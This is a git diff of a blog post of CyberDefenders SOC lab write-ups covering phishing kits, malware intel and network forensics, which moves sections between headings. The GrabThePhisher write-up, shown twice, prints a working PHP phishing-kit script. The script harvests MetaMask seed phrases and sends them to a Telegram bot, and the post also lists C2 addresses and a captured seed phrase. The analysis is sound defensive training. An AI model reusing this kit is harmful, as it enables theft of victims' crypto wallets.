@@ -1,10 +1,10 @@
 ---
-title: CyberDefenders' Lab
+title: "CyberDefenders' Lab:"
 draft: false
 date: 2026-10-30T03:16:38.930Z
 categories:
   - Writeup
-lastmod: 2026-11-18T09:02:52.331Z
+lastmod: 2026-11-18T13:58:18.143Z
 description: Nothing is that serious, so please choose peace.
 cover: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
 tags:
@@ -12,6 +12,24 @@ tags:
   - Threat Intel
 banner: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
 ---
+
+# Endpoint Forensics
+
+## 1. Insider
+- **Date**: Nov xx, 2026
+- **Category**: Endpoint > Disk Forensics
+
+## xx. RedLine
+- **Date**: Nov xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
+- **Category**: Endpoint > Memory Forensics
+
+## xx. Reveal
+- **Date**: Nov xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 4
+- **Category**: Endpoint > Memory Forensics
+
+# Network Forensics
 
 ## 1. Jetbrains
 
@@ -406,404 +424,7 @@ The command overwrites `cron`, rendering it to spawn the malicious reverse shell
 
 `Answer: 14.0.0.120:443`
 
-## 5. GrabThePhisher
-- **Date**: Oct 30, 2026
-- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
-- **Category**: Threat Intel
-
-We are presented with the filesystem of a webpage.
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697271207-c171ec.png)
-
-Go to `index.html`
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697329233-28710a.png)
-
-*I suppose the webpage is created for the purpose of social engineering with this suspicious interface...*
-
-**Q1. Which wallet is used for asking the seed phrase?**
-
-I tried to click on those wallets one by one, but there are no responses, except for MetaMask, which tells me `ERR_FILE_NOT_FOUND`. However, in the filesystem, we can see the folder `metamask`, inside which contains another `index.html`
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697522218-c49d51.png)
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697650252-fa0932.png)
-
-`Answer: MetaMask`
-
-This folder also contains `metamask.php`, making the next two questions pretty much no-brainers.
-
-```php
-<?php
-
-$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
-$array = json_decode($request);
-$geo = $array->country->name_en;
-$city = $array->city->name_en;
-$date = date("m.d.Y"); //aaja
-
-
-/*
- With love and respect to all the hustler out there,
- This is a small gift to my brothers,
- All the best with your luck,
- 
- Regards, 
- j1j1b1s@m3r0
-*/
-
-    $message = "<b>Welcome 2 The Jungle </b> 
-    
-<b>Wallet:</b> Metamask
-<b>Phrase:</b> <code>" . $_POST["data"] . "</code>
-<b>IP:</b> " .$_SERVER['REMOTE_ADDR'] . " | " .$geo. " | " .$city. "
-<b>User:</b> " . $_SERVER['HTTP_USER_AGENT'] . "";
-
-sendTel($message);  
-	
-    function sendTel($message){
-		$id = "5442785564"; 
-        $token = "54574*****:*******************************vxm10"; 
-		$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
-		file_get_contents($filename);
-        $_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
-        @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);	
-    }
-      
-?>
-```
-
-**Q2. What is the file name that has the code for the phishing kit?**
-
-`Answer: metamask.php`
-
-**Q3. In which language was the kit written?**
-
-`Answer: PHP`
-
-**Q4. What service does the kit use to retrieve the victim's machine information?**
-
-Upon inspecting the PHP code:
-
-```php
-$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
-$array = json_decode($request);
-$geo = $array->country->name_en;
-$city = $array->city->name_en;
-$date = date("m.d.Y"); //aaja
-```
-
-I know nothing of `Sypex Geo`, but:
-
-- `http://api...` resembles some kind of services
-- There is `$request`, and `$array`, `$geo`, `$city`, `$date`, all of which seems to extract sensitive geographical information.
-- The `geo` in `sypexgeo` may stand for `geography`.
-
-> Sypex Geo is a high-speed, lightweight tool used to identify a visitor's country, region, city, and geographic coordinates from an IP address
-
-`Answer: Sypex Geo`
-
-**Q5. How many seed phrases were already collected?**
-
-```php
-file_get_contents($filename);
-$_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
-@file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);
-```
-I suppose the phrases are stored in `/log/log.txt`
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793698914298-02a847.png)
-
-`Answer: 3`
-
-**Q6. Could you please provide the seed phrase associated with the most recent phishing incident?**
-
-`Answer: father also recycle embody balance concert mechanic believe owner pair muffin hockey`
-
-**Q7. Which medium was used for credential dumping?**
-
-```php
-$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
-```
-
-`Answer: Telegram`
-
-**Q8. What is the token for accessing the channel?**
-
-```php
-$token = "54574*****:*******************************vxm10";
-```
-
-`Answer: 54574*****:*******************************vxm10`
-
-**Q9. What is the Chat ID for the phisher's channel?**
-
-```php
-$id = "5442785564";
-```
-
-`Answer: 5442785564`
-
-**Q10. What are the allies of the phish kit developer?**
-
-We can see their names in the comment/message.
-
-`Answer: j1j1b1s@m3r0`
-
-## 6. Yellow RAT
-- **Date**: Oct 30, 2026
-- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
-- **Category**: Threat Intel
-
-We are presented with a malware hash `30E527E45F50D2BA82865C5679A6FA998EE0A1755361AB01673950810D071C85`, and we are prompted to gather intel on this malware using online platforms.
-
-**Q1. What name does Red Canary use for the threat cluster associated with the SHA256 in hash.txt? Submit the name used in its technical analysis, without adding a malware-type suffix.**
-
-> In digital forensics, a threat cluster is a group of suspicious activities or incidents that investigators link through shared evidence. That evidence might include malware, attacker controlled servers, commands, or methods used to gain access. Analysts use the cluster to track a pattern while they investigate who is responsible.
-
-With some researches, I stumbled upon this [blog](https://www.zscaler.com/blogs/product-insights/yellow-cockatoo) about the given hash, which reveals that the threat cluster is **Yellow Cockatoo**.
-
-`Answer: Yellow Cockatoo`
-
-**Q2. As part of our incident response, knowing the malware's common filenames can help us scan other workstations for potential infection. What is the common filename associated with this malware? (Use VirusTotal)**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794191943096-7d0c0c.png)
-
-The common filename associated with the malware is shown as above.
-
-`Answer: 111bc461-1ca8-43c6-97ed-911e0e69fdf8.dll`
-
-**Q3. Determining a malware sample's compilation timestamp can reveal insights into its development and deployment timeline. What compilation timestamp does VirusTotal show for this malware sample?**
-
-*Details > History > Creation Time*
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794192034936-f913d4.png)
-
-`Answer: 2020-09-24 18:26`
-
-**Q4. Understanding when the broader cybersecurity community first identified the malware could help determine how long the malware might have been in the environment before detection. When was the malware first submitted to VirusTotal?**
-
-*Details > History > First Submission*
-
-`Answer: 2020-10-15 02:47`
-
-**Q5. To completely eradicate the threat from Industries' systems, we need to identify all components dropped by the malware. What is the name of the .dat file that the malware dropped in the AppData folder?**
-
-To fully understand how the malware really works, see more in the aforementioned [blog](https://www.zscaler.com/blogs/product-insights/yellow-cockatoo).
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794192415554-c58b23.png)
-
-`Answer: solarmarker.dat`
-
-**Q6. It is crucial to identify the C2 servers with which the malware communicates to block its communication and prevent further data exfiltration. What is the C2 server that the malware is communicating with?**
-
-Again, read the above documentation:
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794195762789-b5f95c.png)
-
-You can also find the server in VirusTotal (*Behavior > Activity Summary*)
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794195643873-820a61.png)
-
-`Answer: https://gogohid.com`
-
-## 7. IcedID
-- **Date**: Oct 30, 2026
-- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
-- **Category**: Threat Intel
-
-We are presented with a malware hash `191eda0c539d284b29efe556abb05cd75a9077a0`, and we are prompted to gather intel on this malware using online platforms.
-
-**Q1. What is the name of the file associated with the given hash?**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794198219949-c57506.png)
-
-`Answer: document-1982481273.xlsm`
-
-**Q2. Can you identify the filename of the GIF file that was deployed?**
-
-*Relations > Connected URLs*
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794199472749-092fe3.png)
-
-`Answer: 3003.gif`
-
-**Q3. How many domains does the malware look to download the additional payload file in Q2?**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794200473506-781be1.png)
-
-`Answer: 5`
-
-**Q4. From the domains mentioned in Q3, a DNS registrar was predominantly used by the threat actor to host their harmful content, enabling the malware's functionality. Can you specify the Registrar INC of the domain that end with .com?**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794200453116-59f1b0.png)
-
-From **Q2** and **Q3**, we can see that there is only one Contacted Domain overlaps with the Contacted URL that deploy the `3003.gif`, which is `tajushariya.com`. Its registrar is `NameCheap, Inc.`
-
-`Answer: NAMECHEAP`
-
-**Q5. Could you specify the threat actor linked to the sample provided?**
-
-According to this page [malpedia](https://malpedia.caad.fkie.fraunhofer.de/details/win.icedid), the threat actor behind IcedID is `GOLD CABIN`
-
-`Answer: GOLD CABIN`
-
-**Q6. In the Execution phase, what function does the malware employ to fetch extra payloads onto the system?**
-
-The malware is distributed on Microsoft Excel, Windows. On Windows, `URLDownloadToFile` is a common function for downloading an additional file onto the system. Here we need the ANSI version of it, `URLDownloadToFileA`. The A in the function means it expects those strings for the URL and file path.
-
-> Reference:
-> - https://www.fortinet.com/blog/threat-research/icedid-malware-analysis-part-two
-> - https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)
-
-`Answer: URLDownloadToFileA`
-
-## 8. Red Stealer
-- **Date**: Nov 10, 2026
-- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
-- **Category**: Threat Intel
-
-We are presented with a malware hash `248FCC901AFF4E4B4C48C91E4D78A939BF681C9A1BC24ADDC3551B32768F907B`, and we are prompted to gather intel on this malware using online platforms.
-
-**Q1. Categorizing malware enables a quicker and clearer understanding of its unique behaviors and attack vectors. What category has Microsoft identified for that malware in VirusTotal?**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794396882695-2b3cc7.png)
-
-With Microsoft's threat naming convention and categorization, Trojan should be the correct answer here.
-
-`Answer: Trojan`
-
-**Q2. Clearly identifying the name of the malware file improves communication among the SOC team. What is the file name associated with this malware? Note: Don't include the file extension in the name.**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794397061680-8269e5.png)
-
-`Answer: Wextract`
-
-**Q3. Knowing the exact timestamp of when the malware was first observed can help prioritize response actions. Newly detected malware may require urgent containment and eradication compared to older, well-documented threats. What is the UTC timestamp of the malware's first submission to VirusTotal?**
-
-*Details > History > First Submission*
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794397386975-85f053.png)
-
-`Answer: 2023-10-06 04:41`
-
-**Q4. Understanding the techniques used by malware helps in strategic security planning. What is the MITRE ATT&CK technique ID for the malware collecting data from the local system prior to exfiltration?**
-
-Researching with such keywords from the question, I stumbled upon [MITRE ATT&CK technique ID T1005, Data from Local System](https://attack.mitre.org/techniques/T1005/)
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794397252708-ff5208.png)
-
-`Answer: T1005`
-
-**Q5. Following execution, the malware performs a connectivity check by resolving a well-known social-media domain before contacting its C2. Which single domain does it resolve for this check?**
-
-There are multiple traces of `facebook.com` in *Relations > Contacted URLs & Contacted Domains*
-
-`Answer: facebook.com`
-
-**Q6. Once the malicious IP addresses are identified, network security devices such as firewalls can be configured to block traffic to and from these addresses. Can you provide the IP address and destination port the malware communicates with?**
-
-*Behavior > Network Communication > IP Traffic & Memory Pattern URLs/IPs*
-
-`Answer: 77.91.124.55:19071`
-
-**Q7. YARA rules are designed to identify specific malware patterns and behaviors. Using MalwareBazaar, what's the name of the YARA rule created by "Varp0s" that detects the identified malware?**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404797829-207597.png)
-
-> **YARA** allows analysts to create custom descriptions, known as **YARA** rules, that capture the "DNA" of malware families. These rules combine textual strings, hexadecimal sequences, and regular expressions with Boolean logic. Instead of relying strictly on fragile file hashes (which change if a single byte is altered), **YARA** scans files, memory processes, or directories for specific code fragments, configurations, or behavioral patterns.
-
-
-Go to *MalwareBazaar > Browse* with the search syntax `sha256:248fcc901aff4e4b4c48c91e4d78a939bf681c9a1bc24addc3551b32768f907b`
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404462724-c0558c.png)
-
-*Click on the only result found*
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404624727-5e984c.png)
-
-*Go to YARA*
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404669377-2f9a1b.png)
-
-`Answer: detect_Redline_Stealer`
-
-**Q8. Understanding which malware families are targeting the organization helps in strategic security planning for the future and prioritizing resources based on the threat. Can you provide the different malware alias associated with the malicious IP address according to Malpedia?**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794404976274-3f674c.png)
-
-`Answer: RECORDSTEALER`
-
-**Q9. By identifying the malware's imported DLLs, we can configure security tools to monitor for the loading or unusual usage of these specific DLLs. Can you provide the DLL utilized by the malware for privilege escalation?**
-
-*Details > Portable Executable Info > Imports*
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794405053688-7cf042.png)
-
-Click on each imported DLLs to inspect them further.
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794405097986-ce4456.png)
-
-`ADVAPI32.dll` is seemingly used for privilege escalation, the others are irrelevant.
-
-> Reference: https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/dynamic-link-library
-
-`Answer: ADVAPI32.dll`
-
-## 9. Oski
-- **Date**: Nov 10, 2026
-- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
-- **Category**: Threat Intel
-
-We are presented with a malware hash `12c1842c3ccafe7408c23ebf292ee3d9`, and we are prompted to gather intel on this malware using online platforms.
-
-**Q1. Determining the creation time of the malware can provide insights into its origin. What was the time of malware creation?**
-
-*Details > History > Creation Time*
-
-`Answer: 2022-09-28 17:40`
-
-**Q2. Identifying the command and control (C2) server that the malware communicates with can help trace back to the attacker. Which C2 server does the malware in the PPT file communicate with?**
-
-From *Relations > Contacted URLs | Behavior > Network Communication*, the C2 server that the malware commmunicates seems to be `http://171.22.28.221/5c06c05b7b34e8e6.php`.
-
-`Answer: http://171.22.28.221/5c06c05b7b34e8e6.php`
-
-**Q3. Identifying the initial actions of the malware post-infection can provide insights into its primary objectives. What is the first library that the malware requests post-infection?**
-
-From *Relations > Contacted URLs | Behavior > Network Communication*, the (first) library the malware requests is `sqlite3.dll`.
-
-`Answer: sqlite3.dll`
-
-**Q4. By examining the provided [Recorded Future Triage](https://tria.ge/260730-engzhayhja) report, what RC4 key is used by the malware to decrypt its base64-encoded string?**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794409914324-342eef.png)
-
-`Answer: 5329514621441247975720749009`
-
-**Q5. By examining the MITRE ATT&CK techniques displayed in the [Any.run sandbox report](https://app.any.run/tasks/d55e2294-5377-4a45-b393-f5a8b20f7d44), identify the main MITRE technique (not sub-techniques) the malware uses to steal the user’s password.**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794410067830-6b679f.png)
-
-`Answer: T1555`
-
-**Q6. By examining the child processes displayed in the [Any.run sandbox report](https://app.any.run/tasks/d55e2294-5377-4a45-b393-f5a8b20f7d44), which directory does the malware target for the deletion of all DLL files?**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794410163073-354776.png)
-
-In `cmd.exe`, `del "C:\ProgramData\*.dll"` used the wildcard `*` to apply the deletion to all files in the folder `"C:\ProgramData\*.dll"`
-
-`Answer: C:\ProgramData`
-
-**Q7. Understanding the malware's behavior post-data exfiltration can give insights into its evasion techniques. By analyzing the child processes, after successfully exfiltrating the user's data, how many seconds does it take for the malware to self-delete?**
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794410315458-b5bb4e.png)
-
-There is a 5-second timeout in the deletion.
-
-`Answer: 5`
-
-## 10. BlueSky Ransomware
+## 5. BlueSky Ransomware
 - **Date**: Nov 11, 2026
 - **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 4
 - **Category**: Network Forensics
@@ -1051,100 +672,7 @@ The ransomware belongs to the `Conti` and `BlueSky` families.
 
 `Answer: BlueSky`
 
-## 11. 3CX Supply Chain
-- **Date**: Nov 12, 2026
-- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 4
-- **Category**: Threat Intel
-
-We are presented with a Windows Installer package `.msi`
-
-> MSI file is a standard database file used by Microsoft Windows to install, maintain, update, and remove software.
-
-**Q1. Understanding the scope of the attack and identifying which versions exhibit malicious behavior is crucial for making informed decisions if these compromised versions are present in the organization. How many versions of 3CX running on Windows have been flagged as malware?**
-
-The question prompts us to investigate public threat intelligence reports on the 3CX compromise via cybersecurity vendors, such as `Zscaler`, `Unit42`, `Mandiant`, `CrowdStrik`, or `SentinelOne`
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794468566913-f19c8c.png)
-
-There are two affected versions running on Windows.
-
-`Answer: 2`
-
-**Q2. Determining the age of the malware can help assess the extent of the compromise and track the evolution of malware families and variants. What's the UTC creation time of the .msi malware?**
-
-Upload the file onto VirusTotal and start inspecting.
-
-`Answer: 2023-03-13 06:33`
-
-**Q3. Executable files (.exe) are frequently used as primary or secondary malware payloads, while dynamic link libraries (.dll) often load malicious code or enhance malware functionality. Analyzing files deposited by the Microsoft Software Installer (.msi) is crucial for identifying malicious files and investigating their full potential. Which malicious DLLs were dropped by the .msi file?**
-
-There is a handful amount of `.dll` files upon inspecting `Files Dropped`
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469051180-20a96f.png)
-
-Which of them is the malicious one, you may ask? We can inspect them further by taking their SHA256 to view it again on the very VirusTotal
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469175340-703e20.png)
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469331095-bcfaf4.png)
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469301486-462f58.png)
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794469349581-f91132.png)
-
-As we can see,only the two files `ffmpeg.dll` and `d3dcompiler_47.dll` are marked as malicious (as trojans, to be precise), while the others are not harmful.
-
-`Answer: ffmpeg.dll,d3dcompiler_47.dll`
-
-**Q4. Recognizing the persistence techniques used in this incident is essential for current mitigation strategies and future defense improvements. What is the MITRE Technique ID employed by the .msi files to load the malicious DLL?**
-
-Search for the `3CX Supply Chain Attack` campaign.
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794472386279-263519.png)
-
-Reading further, there is a technique with a befitting description:
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794474081905-f8c1f2.png)
-
-`Answer: T1574`
-
-**Q5. Recognizing the malware type (threat category) is essential to your investigation, as it can offer valuable insight into the possible malicious actions you'll be examining. What is the threat category of the two malicious DLLs?**
-
-`Answer: Trojan`
-
-**Q6. As a threat intelligence analyst conducting dynamic analysis, it's vital to understand how malware can evade detection in virtualized environments or analysis systems. This knowledge will help you effectively mitigate or address these evasive tactics. What is the MITRE ID for the virtualization/sandbox evasion techniques used by the two malicious DLLs?**
-
-`Virtualization/Sandbox Evasion` falls below `Stealth` and `Discovery`.
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794474655960-56ae31.png)
-
-`Answer: T1497`
-
-**Q7. When conducting malware analysis and reverse engineering, understanding anti-analysis techniques is vital to avoid wasting time. Which hypervisor is targeted by the anti-analysis techniques in the ffmpeg.dll file?**
-
-Investigate the `ffmpeg.dll` on VirusTotal using its hash. Navigate to *Behavior > Capabilities*
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794475673568-0633ef.png)
-
-`Answer: VMware`
-
-**Q8. Identifying the cryptographic method used in malware is crucial for understanding the techniques employed to bypass defense mechanisms and execute its functions fully. What encryption algorithm is used by the ffmpeg.dll file?**
-
-Such cryptographic method can be seen in the previous image, but you can see it on a [cybersecurity vendor](https://unit42.paloaltonetworks.com/3cxdesktopapp-supply-chain-attack/), too.
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794475810235-b70aed.png)
-
-`Answer: RC4`
-
-**Q9. As an analyst, you've recognized some TTPs involved in the incident, but identifying the APT group responsible will help you search for their usual TTPs and uncover other potential malicious activities. Which group is responsible for this attack?**
-
-The question asks for the threat actor, so I naturally went to `Malpedia`.
-
-![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794468874543-884af4.png)
-
-`Answer: Lazarus`
-
-## 12. Web Investigation
+## 6. Web Investigation
 - **Date**: Nov 12, 2026
 - **Category**: Network Forensics
 
@@ -1259,7 +787,7 @@ Inspect the observed `/admin/uploads/`, we can see there is a suspicious PHP.
 
 `Answer: NVri2vhp.php`
 
-## 13. HawkEye
+## 7. HawkEye
 - **Date**: Nov 13, 2026
 - **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 6
 - **Category**: Network Forensics
@@ -1529,7 +1057,7 @@ The email is sent every 10 minutes, starting with a `GET` request in `HTTP` prot
 
 `Answer: 10`
 
-## 14. DanaBot
+## 8. DanaBot
 - **Date**: Nov 13, 2026
 - **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
 - **Category**: Network Forensics
@@ -1582,7 +1110,7 @@ Export the file and check the hash on VirusTotal.
 
 `Answer: e758e07113016aca55d9eda2b0ffeebe`
 
-## 15. XLMRat
+## 9. XLMRat
 - **Date**: Nov 14, 2026
 - **Category**: Network Forensics
 
@@ -1614,7 +1142,7 @@ Export the file and check the hash on VirusTotal.
 
 `Answer: Conted.vbs,Conted.ps1,Conted.bat`
 
-## 16. HoneyBOT
+## 10. HoneyBOT
 - **Date**: Nov 16, 2026
 - **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 8
 - **Category**: Network Forensics
@@ -1664,20 +1192,504 @@ Export the file and check the hash on VirusTotal.
 
 **Q14. The shellcode used a specific technique to determine its location in memory. What is the OS file being queried during this process?**
 
-## 17. EscapeRoom
+## 11. EscapeRoom
 - **Date**: Nov xx, 2026
 - **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 8
 - **Category**: Network Forensics
 
-## 18. RedLine
-- **Date**: Nov xx, 2026
-- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
-- **Category**: Endpoint Forensics
+# Threat Intel
 
-## 19. Reveal
-- **Date**: Nov xx, 2026
+## 1. GrabThePhisher
+- **Date**: Oct 30, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
+- **Category**: Threat Intel
+
+We are presented with the filesystem of a webpage.
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697271207-c171ec.png)
+
+Go to `index.html`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697329233-28710a.png)
+
+*I suppose the webpage is created for the purpose of social engineering with this suspicious interface...*
+
+**Q1. Which wallet is used for asking the seed phrase?**
+
+I tried to click on those wallets one by one, but there are no responses, except for MetaMask, which tells me `ERR_FILE_NOT_FOUND`. However, in the filesystem, we can see the folder `metamask`, inside which contains another `index.html`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697522218-c49d51.png)
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697650252-fa0932.png)
+
+`Answer: MetaMask`
+
+This folder also contains `metamask.php`, making the next two questions pretty much no-brainers.
+
+```php
+<?php
+
+$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
+$array = json_decode($request);
+$geo = $array->country->name_en;
+$city = $array->city->name_en;
+$date = date("m.d.Y"); //aaja
+
+
+/*
+ With love and respect to all the hustler out there,
+ This is a small gift to my brothers,
+ All the best with your luck,
+ 
+ Regards, 
+ j1j1b1s@m3r0
+*/
+
+    $message = "<b>Welcome 2 The Jungle </b> 
+    
+<b>Wallet:</b> Metamask
+<b>Phrase:</b> <code>" . $_POST["data"] . "</code>
+<b>IP:</b> " .$_SERVER['REMOTE_ADDR'] . " | " .$geo. " | " .$city. "
+<b>User:</b> " . $_SERVER['HTTP_USER_AGENT'] . "";
+
+sendTel($message);  
+	
+    function sendTel($message){
+		$id = "5442785564"; 
+        $token = "54574*****:*******************************vxm10"; 
+		$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
+		file_get_contents($filename);
+        $_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
+        @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);	
+    }
+      
+?>
+```
+
+**Q2. What is the file name that has the code for the phishing kit?**
+
+`Answer: metamask.php`
+
+**Q3. In which language was the kit written?**
+
+`Answer: PHP`
+
+**Q4. What service does the kit use to retrieve the victim's machine information?**
+
+Upon inspecting the PHP code:
+
+```php
+$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
+$array = json_decode($request);
+$geo = $array->country->name_en;
+$city = $array->city->name_en;
+$date = date("m.d.Y"); //aaja
+```
+
+I know nothing of `Sypex Geo`, but:
+
+- `http://api...` resembles some kind of services
+- There is `$request`, and `$array`, `$geo`, `$city`, `$date`, all of which seems to extract sensitive geographical information.
+- The `geo` in `sypexgeo` may stand for `geography`.
+
+> Sypex Geo is a high-speed, lightweight tool used to identify a visitor's country, region, city, and geographic coordinates from an IP address
+
+`Answer: Sypex Geo`
+
+**Q5. How many seed phrases were already collected?**
+
+```php
+file_get_contents($filename);
+$_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
+@file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);
+```
+I suppose the phrases are stored in `/log/log.txt`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793698914298-02a847.png)
+
+`Answer: 3`
+
+**Q6. Could you please provide the seed phrase associated with the most recent phishing incident?**
+
+`Answer: father also recycle embody balance concert mechanic believe owner pair muffin hockey`
+
+**Q7. Which medium was used for credential dumping?**
+
+```php
+$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
+```
+
+`Answer: Telegram`
+
+**Q8. What is the token for accessing the channel?**
+
+```php
+$token = "54574*****:*******************************vxm10";
+```
+
+`Answer: 54574*****:*******************************vxm10`
+
+**Q9. What is the Chat ID for the phisher's channel?**
+
+```php
+$id = "5442785564";
+```
+
+`Answer: 5442785564`
+
+**Q10. What are the allies of the phish kit developer?**
+
+We can see their names in the comment/message.
+
+`Answer: j1j1b1s@m3r0`
+
+## 2. Yellow RAT
+- **Date**: Oct 30, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
+- **Category**: Threat Intel
+
+We are presented with a malware hash `30E527E45F50D2BA82865C5679A6FA998EE0A1755361AB01673950810D071C85`, and we are prompted to gather intel on this malware using online platforms.
+
+**Q1. What name does Red Canary use for the threat cluster associated with the SHA256 in hash.txt? Submit the name used in its technical analysis, without adding a malware-type suffix.**
+
+> In digital forensics, a threat cluster is a group of suspicious activities or incidents that investigators link through shared evidence. That evidence might include malware, attacker controlled servers, commands, or methods used to gain access. Analysts use the cluster to track a pattern while they investigate who is responsible.
+
+With some researches, I stumbled upon this [blog](https://www.zscaler.com/blogs/product-insights/yellow-cockatoo) about the given hash, which reveals that the threat cluster is **Yellow Cockatoo**.
+
+`Answer: Yellow Cockatoo`
+
+**Q2. As part of our incident response, knowing the malware's common filenames can help us scan other workstations for potential infection. What is the common filename associated with this malware? (Use VirusTotal)**
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794191943096-7d0c0c.png)
+
+The common filename associated with the malware is shown as above.
+
+`Answer: 111bc461-1ca8-43c6-97ed-911e0e69fdf8.dll`
+
+**Q3. Determining a malware sample's compilation timestamp can reveal insights into its development and deployment timeline. What compilation timestamp does VirusTotal show for this malware sample?**
+
+*Details > History > Creation Time*
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794192034936-f913d4.png)
+
+`Answer: 2020-09-24 18:26`
+
+**Q4. Understanding when the broader cybersecurity community first identified the malware could help determine how long the malware might have been in the environment before detection. When was the malware first submitted to VirusTotal?**
+
+*Details > History > First Submission*
+
+`Answer: 2020-10-15 02:47`
+
+**Q5. To completely eradicate the threat from Industries' systems, we need to identify all components dropped by the malware. What is the name of the .dat file that the malware dropped in the AppData folder?**
+
+To fully understand how the malware really works, see more in the aforementioned [blog](https://www.zscaler.com/blogs/product-insights/yellow-cockatoo).
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794192415554-c58b23.png)
+
+`Answer: solarmarker.dat`
+
+**Q6. It is crucial to identify the C2 servers with which the malware communicates to block its communication and prevent further data exfiltration. What is the C2 server that the malware is communicating with?**
+
+Again, read the above documentation:
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794195762789-b5f95c.png)
+
+You can also find the server in VirusTotal (*Behavior > Activity Summary*)
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794195643873-820a61.png)
+
